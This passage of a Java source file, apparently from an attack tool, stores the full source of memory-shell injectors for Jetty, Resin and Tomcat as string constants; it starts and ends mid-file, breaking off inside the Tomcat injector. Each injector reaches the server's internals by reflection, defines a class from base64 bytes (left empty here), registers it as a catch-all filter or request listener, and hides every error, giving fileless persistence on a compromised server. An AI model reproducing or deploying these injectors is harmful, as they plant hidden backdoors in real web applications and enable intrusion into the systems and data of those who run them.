            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "}\n";

    public static final String JettyFilterMemShell =
            "import java.lang.reflect.Array;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class JettyFilterMemShell {\n" +
            "    private static String CLAZZ_NAME = \"memshell.JettyFilterShell\";\n" +
            "\n" +
            "    public JettyFilterMemShell() {\n" +
            "        Object var1 = getContext();\n" +
            "        if (var1 != null) {\n" +
            "            IMC();\n" +
            "            IMF(var1);\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMF(Object var1) {\n" +
            "        try {\n" +
            "            Class var2 = Thread.currentThread().getContextClassLoader().loadClass(CLAZZ_NAME);\n" +
            "            if (isInjected(var1, var2.getName())) {\n" +
            "                return;\n" +
            "            }\n" +
            "\n" +
            "            Method var3 = var1.getClass().getDeclaredMethod(\"addFilterWithMapping\", Class.class, String.class, Integer.TYPE);\n" +
            "            var3.invoke(var1, var2, \"/*\", 1);\n" +
            "            Field var4 = var1.getClass().getDeclaredField(\"_filterMappings\");\n" +
            "            var4.setAccessible(true);\n" +
            "            Object var5 = var4.get(var1);\n" +
            "            Object[] var6 = new Object[Array.getLength(var5)];\n" +
            "            int var7 = 1;\n" +
            "\n" +
            "            int var8;\n" +
            "            for(var8 = 0; var8 < Array.getLength(var5); ++var8) {\n" +
            "                Object var9 = Array.get(var5, var8);\n" +
            "                Field var10 = var9.getClass().getDeclaredField(\"_filterName\");\n" +
            "                var10.setAccessible(true);\n" +
            "                String var11 = (String)var10.get(var9);\n" +
            "                if (var11.contains(var2.getName())) {\n" +
            "                    var6[0] = var9;\n" +
            "                } else {\n" +
            "                    var6[var7] = var9;\n" +
            "                    ++var7;\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            for(var8 = 0; var8 < var6.length; ++var8) {\n" +
            "                Array.set(var5, var8, var6[var8]);\n" +
            "            }\n" +
            "        } catch (Exception var12) {\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized Object getContext() {\n" +
            "        try {\n" +
            "            Thread var1 = Thread.currentThread();\n" +
            "            Field var2 = Class.forName(\"java.lang.Thread\").getDeclaredField(\"threadLocals\");\n" +
            "            var2.setAccessible(true);\n" +
            "            Object var3 = var2.get(var1);\n" +
            "            Class var4 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap\");\n" +
            "            Field var5 = var4.getDeclaredField(\"table\");\n" +
            "            var5.setAccessible(true);\n" +
            "            Object var6 = var5.get(var3);\n" +
            "            Class var7 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap$Entry\");\n" +
            "            Field var8 = var7.getDeclaredField(\"value\");\n" +
            "            var8.setAccessible(true);\n" +
            "            Object var9 = null;\n" +
            "\n" +
            "            for(int var11 = 0; var11 < Array.getLength(var6); ++var11) {\n" +
            "                Object var10 = Array.get(var6, var11);\n" +
            "                if (var10 != null) {\n" +
            "                    var9 = var8.get(var10);\n" +
            "                    if (var9 != null && var9.getClass().getName().equals(\"org.eclipse.jetty.server.HttpConnection\")) {\n" +
            "                        break;\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Class var23 = var9.getClass();\n" +
            "            Object var12 = var23.getMethod(\"getHttpChannel\").invoke(var9);\n" +
            "            Object var13 = var12.getClass().getMethod(\"getRequest\").invoke(var12);\n" +
            "            Object var16 = var13.getClass().getMethod(\"getSession\").invoke(var13);\n" +
            "            Object var17 = var16.getClass().getMethod(\"getServletContext\").invoke(var16);\n" +
            "            Field var18 = var17.getClass().getDeclaredField(\"this$0\");\n" +
            "            var18.setAccessible(true);\n" +
            "            Object var19 = var18.get(var17);\n" +
            "            Field var20 = var19.getClass().getSuperclass().getDeclaredField(\"_servletHandler\");\n" +
            "            var20.setAccessible(true);\n" +
            "            Object var21 = var20.get(var19);\n" +
            "            return var21;\n" +
            "\n" +
            "        } catch (Exception var22) {\n" +
            "        }\n" +
            "\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(CLAZZ_NAME);\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"\");\n" +
            "                Class var3 = (Class)var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                CLAZZ_NAME = var3.getName();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized boolean isInjected(Object var0, String var1) throws NoSuchFieldException, IllegalAccessException {\n" +
            "        Field var2 = var0.getClass().getDeclaredField(\"_filterMappings\");\n" +
            "        var2.setAccessible(true);\n" +
            "        Object var3 = var2.get(var0);\n" +
            "\n" +
            "        for(int var4 = 0; var4 < Array.getLength(var3); ++var4) {\n" +
            "            Object var5 = Array.get(var3, var4);\n" +
            "            Field var6 = var5.getClass().getDeclaredField(\"_filterName\");\n" +
            "            var6.setAccessible(true);\n" +
            "            String var7 = (String)var6.get(var5);\n" +
            "            if (var7.contains(var1)) {\n" +
            "                return true;\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return false;\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "    static {\n" +
            "        new JettyFilterMemShell();\n" +
            "    }\n" +
            "}\n" +
            "\n";

    public static final String JettyListenerMemShell =
            "import java.lang.reflect.Array;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.EventListener;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.List;\n" +
            "\n" +
            "public class JettyListenerMemShell {\n" +
            "    public static Object MEMSHELL_OBJECT;\n" +
            "    static String ListenerName = \"memshell.JettyListenerShell\";\n" +
            "\n" +
            "    public JettyListenerMemShell() {\n" +
            "        Object var1 = getContext();\n" +
            "        if (var1 != null && !isInjected(var1)) {\n" +
            "            injectMemShellClass();\n" +
            "            injectMemShell(var1);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized boolean isInjected(Object context) {\n" +
            "        try {\n" +
            "            List var2 = (List) getFV(context, \"_eventListeners\");\n" +
            "            ;\n" +
            "            Iterator var3 = var2.iterator();\n" +
            "            while (var3.hasNext()) {\n" +
            "                Object var4 = var3.next();\n" +
            "                if (var4.getClass().getName().contains(ListenerName)) {\n" +
            "                    return true;\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return false;\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void injectMemShell(Object context) {\n" +
            "        try {\n" +
            "            Method var3 = getMethodByClass(context.getClass(), \"addEventListener\", EventListener.class);\n" +
            "            var3.setAccessible(true);\n" +
            "            var3.invoke(context, MEMSHELL_OBJECT);\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized Object getContext() {\n" +
            "        try {\n" +
            "            Thread var1 = Thread.currentThread();\n" +
            "            Field var2 = Class.forName(\"java.lang.Thread\").getDeclaredField(\"threadLocals\");\n" +
            "            var2.setAccessible(true);\n" +
            "            Object var3 = var2.get(var1);\n" +
            "            Class var4 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap\");\n" +
            "            Field var5 = var4.getDeclaredField(\"table\");\n" +
            "            var5.setAccessible(true);\n" +
            "            Object var6 = var5.get(var3);\n" +
            "            Class var7 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap$Entry\");\n" +
            "            Field var8 = var7.getDeclaredField(\"value\");\n" +
            "            var8.setAccessible(true);\n" +
            "            Object var9 = null;\n" +
            "\n" +
            "            for(int var11 = 0; var11 < Array.getLength(var6); ++var11) {\n" +
            "                Object var10 = Array.get(var6, var11);\n" +
            "                if (var10 != null) {\n" +
            "                    var9 = var8.get(var10);\n" +
            "                    if (var9 != null && var9.getClass().getName().equals(\"org.eclipse.jetty.server.HttpConnection\")) {\n" +
            "                        break;\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "            Class var23 = var9.getClass();\n" +
            "            Object var12 = var23.getMethod(\"getHttpChannel\").invoke(var9);\n" +
            "            Object var13 = var12.getClass().getMethod(\"getRequest\").invoke(var12);\n" +
            "            Object var16 = var13.getClass().getMethod(\"getSession\").invoke(var13);\n" +
            "            Object var17 = var16.getClass().getMethod(\"getServletContext\").invoke(var16);\n" +
            "            Object var19 = getFV(var17, \"this$0\");\n" +
            "            Object var21 = getFV(var19, \"_servletHandler\");\n" +
            "            Object var24 = getFV(var21, \"_contextHandler\");\n" +
            "            return var24;\n" +
            "\n" +
            "        } catch (Exception var22) {\n" +
            "        }\n" +
            "\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public static void injectMemShellClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"\");\n" +
            "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                MEMSHELL_OBJECT = var3.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static{\n" +
            "        new JettyListenerMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String ResinFilterMemShell =
            "import javax.servlet.Filter;\n" +
            "import javax.servlet.ServletContext;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "\n" +
            "public class ResinFilterMemShell {\n" +
            "\n" +
            "    static {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public ResinFilterMemShell() {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void Inject() {\n" +
            "        try {\n" +
            "            String filterName = \"memshell.ResinFilterShell\";\n" +
            "            String urlPattern = \"/*\";\n" +
            "\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            Class servletInvocation = classLoader.loadClass(\"com.caucho.server.dispatch.ServletInvocation\");\n" +
            "\n" +
            "            Object contextRequest = servletInvocation.getMethod(\"getContextRequest\").invoke(null);\n" +
            "            Object webapp = contextRequest.getClass().getMethod(\"getWebApp\").invoke(contextRequest);\n" +
            "            Class<?> FilterConfigImplClass = classLoader.loadClass(\"com.caucho.server.dispatch.FilterConfigImpl\");\n" +
            "            String FilterBase64 = \"\";\n" +
            "            byte[] FilterClass = base64Decode(FilterBase64);\n" +
            "\n" +
            "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass1.setAccessible(true);\n" +
            "            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);\n" +
            "            Object filter_class = (Object) filterClass.newInstance();\n" +
            "\n" +
            "            Class filterConfigImplCls = classLoader.loadClass(\"com.caucho.server.dispatch.FilterConfigImpl\");\n" +
            "            Object filterConfigImpl = filterConfigImplCls.newInstance();\n" +
            "\n" +
            "            Method m1 = filterConfigImpl.getClass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
            "            m1.setAccessible(true);\n" +
            "            m1.invoke(filterConfigImpl, filterName);\n" +
            "\n" +
            "            Method m2 = filterConfigImpl.getClass().getDeclaredMethod(\"setFilterClass\", String.class);\n" +
            "            m2.setAccessible(true);\n" +
            "            m2.invoke(filterConfigImpl, filterName);\n" +
            "\n" +
            "            Method m3=filterConfigImpl.getClass().getDeclaredMethod(\"setFilter\", Filter.class);\n" +
            "            m3.setAccessible(true);\n" +
            "            m3.invoke(filterConfigImpl,filter_class);\n" +
            "\n" +
            "            // 4.X getClass | 3.X getClass().getSuperClass\n" +
            "            Method m4 = null;\n" +
            "            try {\n" +
            "                m4 = webapp.getClass().getDeclaredMethod(\"addFilter\", FilterConfigImplClass);\n" +
            "            } catch (Exception e) {\n" +
            "                m4 = webapp.getClass().getSuperclass().getDeclaredMethod(\"addFilter\", FilterConfigImplClass);\n" +
            "            }\n" +
            "            m4.invoke(webapp, filterConfigImpl);\n" +
            "\n" +
            "            Class filterMappingCls = classLoader.loadClass(\"com.caucho.server.dispatch.FilterMapping\");\n" +
            "            Object filterMapping = filterMappingCls.newInstance();\n" +
            "\n" +
            "            Method m5 = filterMapping.getClass().getDeclaredMethod(\"createUrlPattern\");\n" +
            "            m5.setAccessible(true);\n" +
            "            Object o5 = m5.invoke(filterMapping);\n" +
            "\n" +
            "            Method m6 = o5.getClass().getDeclaredMethod(\"addText\", String.class);\n" +
            "            m6.setAccessible(true);\n" +
            "            m6.invoke(o5, urlPattern);\n" +
            "\n" +
            "            Method m7 = filterMapping.getClass().getSuperclass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
            "            m7.setAccessible(true);\n" +
            "            m7.invoke(filterMapping, filterName);\n" +
            "\n" +
            "            Method m8 = filterMapping.getClass().getSuperclass().getDeclaredMethod(\"setServletContext\", ServletContext.class);\n" +
            "            m8.setAccessible(true);\n" +
            "            m8.invoke(filterMapping, webapp);\n" +
            "\n" +
            "            // 4.X getClass | 3.X getClass().getSuperClass\n" +
            "            Field f1 = null;\n" +
            "            try {\n" +
            "                f1 = webapp.getClass().getDeclaredField(\"_filterMapper\");\n" +
            "            } catch (Exception e) {\n" +
            "                f1 = webapp.getClass().getSuperclass().getDeclaredField(\"_filterMapper\");\n" +
            "            }\n" +
            "            f1.setAccessible(true);\n" +
            "            Object filterMapper = f1.get(webapp);\n" +
            "\n" +
            "            Field f2 = filterMapper.getClass().getDeclaredField(\"_filterMap\");\n" +
            "            f2.setAccessible(true);\n" +
            "            ArrayList filterMap = (ArrayList) f2.get(filterMapper);\n" +
            "\n" +
            "            filterMap.add(0, filterMapping);\n" +
            "\n" +
            "            f1.set(webapp, filterMapper);\n" +
            "\n" +
            "            // 4.X getClass | 3.X getClass().getSuperClass\n" +
            "            Field f3 = null;\n" +
            "            try {\n" +
            "                f3 = webapp.getClass().getDeclaredField(\"_loginFilterMapper\");\n" +
            "            } catch (Exception e) {\n" +
            "                f3 = webapp.getClass().getSuperclass().getDeclaredField(\"_loginFilterMapper\");\n" +
            "            }\n" +
            "            f3.setAccessible(true);\n" +
            "            Object loginFilterMapper = f3.get(webapp);\n" +
            "\n" +
            "            Field f4 = loginFilterMapper.getClass().getDeclaredField(\"_filterMap\");\n" +
            "            f4.setAccessible(true);\n" +
            "            ArrayList filterMap2 = (ArrayList) f4.get(loginFilterMapper);\n" +
            "\n" +
            "            filterMap2.add(0, filterMapping);\n" +
            "            f3.set(webapp, loginFilterMapper);\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "}\n";

    public static final String ResinListenerMemShell =
            "import javax.servlet.ServletRequestListener;\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class ResinListenerMemShell {\n" +
            "    static {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public ResinListenerMemShell() {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void Inject() {\n" +
            "        try {\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            Class servletInvocation = classLoader.loadClass(\"com.caucho.server.dispatch.ServletInvocation\");\n" +
            "\n" +
            "            Object contextRequest = servletInvocation.getMethod(\"getContextRequest\").invoke(null);\n" +
            "            Object webapp = contextRequest.getClass().getMethod(\"getWebApp\").invoke(contextRequest);\n" +
            "            String ListenerBase64 = \"\";\n" +
            "            byte[] ListenerClass = base64Decode(ListenerBase64);\n" +
            "\n" +
            "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass1.setAccessible(true);\n" +
            "            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);\n" +
            "\n" +
            "            ServletRequestListener listenerObject = (ServletRequestListener) listenerClass.newInstance();\n" +
            "\n" +
            "            // 4.X ListenerConfig | 3.X Listener\n" +
            "            Class ListenerConfigCls = null;\n" +
            "            try {\n" +
            "                ListenerConfigCls = classLoader.loadClass(\"com.caucho.server.webapp.ListenerConfig\");\n" +
            "            } catch (Exception e) {\n" +
            "                ListenerConfigCls = classLoader.loadClass(\"com.caucho.server.webapp.Listener\");\n" +
            "            }\n" +
            "            Object ListenerConfig = ListenerConfigCls.newInstance();\n" +
            "\n" +
            "            Method m1 = ListenerConfig.getClass().getDeclaredMethod(\"setListenerClass\", Class.class);\n" +
            "            m1.setAccessible(true);\n" +
            "            m1.invoke(ListenerConfig, listenerClass);\n" +
            "\n" +
            "            // // 4.X getClass() ListenerConfig  | 3.X getClass().getSuperClass*() Listener\n" +
            "            Method m2 = null;\n" +
            "            try {\n" +
            "                m2 = webapp.getClass().getDeclaredMethod(\"addListener\", ListenerConfig.getClass());\n" +
            "            } catch (Exception e) {\n" +
            "                m2 = webapp.getClass().getSuperclass().getDeclaredMethod(\"addListener\", ListenerConfig.getClass());\n" +
            "            }\n" +
            "            m2.setAccessible(true);\n" +
            "            m2.invoke(webapp, ListenerConfig);\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "}\n";

    public static final String TomcatListenerMemShell =
                    "import java.lang.reflect.Field;\n" +
                    "import java.lang.reflect.Method;\n" +
                    "import java.util.ArrayList;\n" +
                    "import java.util.Arrays;\n" +
                    "import java.util.Iterator;\n" +
                    "import java.util.List;\n" +
                    "\n" +
                    "public class TomcatListenerMemShell {\n" +
                    "\n" +
                    "    public static Object STANDARD_CONTEXT;\n" +
                    "    public static Object RESPONSE;\n" +
                    "    public static Object MEMSHELL_OBJECT;\n" +
                    "    static String ListenerName = \"memshell.TomcatListenerShell\";\n" +
                    "\n" +
                    "    public TomcatListenerMemShell() {\n" +
                    "        try {\n" +
                    "            if (STANDARD_CONTEXT == null) {\n" +
                    "                getStandardContext();\n" +
                    "                getStandardContext1();\n" +
                    "            }\n" +
                    "            if (!isInject()) {\n" +
                    "                injectMemShellClass();\n" +
                    "                injectMemShell();\n" +
                    "            }\n" +
                    "        } catch (Exception var2) {\n" +
                    "\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized boolean isInject() {\n" +
                    "        boolean flag = false;\n" +
                    "        try {\n" +
                    "            Method var14 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"getApplicationEventListeners\");\n" +
                    "            var14.setAccessible(true);\n" +
                    "            Object[] objects = (Object[]) var14.invoke(STANDARD_CONTEXT);\n" +
                    "            for (Object object : objects) {\n" +
                    "                if (object.getClass().getName().equals(ListenerName)) {\n" +
                    "                    flag = true;\n" +
                    "                }\n" +
                    "\n" +
                    "            }\n" +
                    "\n" +
                    "        } catch (Exception e) {\n" +
                    "\n" +
                    "        }\n" +
                    "\n" +
                    "        return flag;\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized void injectMemShell() {\n" +
                    "        try {\n" +
                    "            try {\n" +
                    "                Field var10 = STANDARD_CONTEXT.getClass().getDeclaredField(\"applicationEventListenersObjects\");\n" +
                    "                var10.setAccessible(true);\n" +
                    "                Object[] var12 = (Object[]) ((Object[]) var10.get(STANDARD_CONTEXT));\n" +
                    "                List var13 = Arrays.asList(var12);\n" +
                    "                ArrayList var3 = new ArrayList();\n" +
                    "                Boolean var4 = false;\n" +
                    "                Iterator var5 = var13.iterator();\n" +
                    "\n" +
                    "                while (var5.hasNext()) {\n" +
                    "                    Object var6 = var5.next();\n" +
                    "                    var3.add(var6);\n" +
                    "                    if (var6.getClass().getName().equals(ListenerName)) {\n" +
                    "                        var4 = true;\n" +
                    "                    }\n" +
                    "                }\n" +
                    "\n" +
                    "                if (!var4) {\n" +
                    "                    var3.add(MEMSHELL_OBJECT);\n" +
                    "                    Method var14 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"setApplicationEventListeners\", Object[].class);\n" +
                    "                    var14.setAccessible(true);\n" +
                    "                    var14.invoke(STANDARD_CONTEXT, (Object) var3.toArray());\n" +
                    "                }\n" +
                    "            } catch (Exception var8) {\n" +
                    "                Method var11 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"addApplicationListener\", String.class);\n" +
                    "                var11.invoke(STANDARD_CONTEXT, ListenerName);\n" +
                    "                Method var2 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"addApplicationEventListener\", Object.class);\n" +
                    "                var2.setAccessible(true);\n" +
                    "                var2.invoke(STANDARD_CONTEXT, MEMSHELL_OBJECT);\n" +
                    "            }\n" +
                    "\n" +
                    "        } catch (Throwable var9) {\n" +
                    "            Throwable var0 = var9;\n" +
                    "        }\n" +
                    "\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                    "        Field var2 = null;\n" +
                    "        Class var3 = var0.getClass();\n" +
                    "\n" +
                    "        while (var3 != Object.class) {\n" +
                    "            try {\n" +
                    "                var2 = var3.getDeclaredField(var1);\n" +
                    "                break;\n" +
                    "            } catch (NoSuchFieldException var5) {\n" +
                    "                var3 = var3.getSuperclass();\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        if (var2 == null) {\n" +
                    "            throw new NoSuchFieldException(var1);\n" +
                    "        } else {\n" +
                    "            var2.setAccessible(true);\n" +
                    "            return var2.get(var0);\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private void getStandardContext1() {\n" +
                    "        try {\n" +
                    "            Object request = Class.forName(\"com.opensymphony.webwork.ServletActionContext\").getMethod(\"getRequest\").invoke(null);\n" +
                    "            Object servletContext = invokeMethod(request, \"getServletContext\");\n" +
                    "            STANDARD_CONTEXT =  getFV(getFV(servletContext,\"context\"), \"context\");\n" +
                    "        } catch (Exception e) {\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private Object invokeMethod(Object obj,String methodName,Object... parameters){\n" +
                    "        try {\n" +
                    "            ArrayList classes = new ArrayList();\n" +
                    "            if (parameters!=null){\n" +
                    "                for (int i=0;i<parameters.length;i++){\n" +
                    "                    Object o1=parameters[i];\n" +
                    "                    if (o1!=null){\n" +
                    "                        classes.add(o1.getClass());\n" +
                    "                    }else{\n" +
                    "                        classes.add(null);\n" +
                    "                    }\n" +
                    "                }\n" +
                    "            }\n" +
                    "            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));\n" +
                    "\n" +
                    "            return method.invoke(obj, parameters);\n" +
                    "        }catch (Exception e){\n" +
                    "//        \te.printStackTrace();\n" +
                    "        }\n" +
                    "        return null;\n" +
                    "    }\n" +
                    "    private Method getMethodByClass(Class cs,String methodName,Class... parameters){\n" +
                    "        Method method=null;\n" +
                    "        while (cs!=null){\n" +
                    "            try {\n" +
                    "                method=cs.getMethod(methodName, parameters);\n" +
                    "                cs=null;\n" +
                    "            }catch (Exception e){\n" +
                    "                cs=cs.getSuperclass();\n" +
                    "            }\n" +
                    "        }\n" +
                    "        return method;\n" +
                    "    }\n" +
                    "    public static synchronized void getStandardContext() throws Exception {\n" +
                    "        boolean var0 = false;\n" +
                    "        Thread[] var1 = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));\n" +
                    "\n" +
                    "        for (int var2 = 0; var2 < var1.length; ++var2) {\n" +
                    "            Thread var3 = var1[var2];\n" +
                    "            if (var3 != null) {\n" +
                    "                String var4 = var3.getName();\n" +
                    "//                if (!var4.contains(\"exec\") && var4.contains(\"http\")) {\n" +
                    "                try {\n" +
                    "                    if (var4.startsWith(\"http\")) {\n" +
                    "                        Object var5 = getFV(var3, \"target\");\n" +
                    "                        if (var5 instanceof Runnable) {\n" +
                    "                            Object var6;\n" +
                    "                            try {\n" +
                    "                                var6 = getFV(getFV(getFV(var5, \"this$0\"), \"handler\"), \"global\");\n" +
                    "                            } catch (Exception var17) {\n" +
                    "                                continue;\n" +
                    "                            }\n" +
                    "\n" +
                    "                            List var7 = (List) getFV(var6, \"processors\");\n" +
                    "\n" +
                    "                            for (int var8 = 0; var8 < var7.size(); ++var8) {\n" +
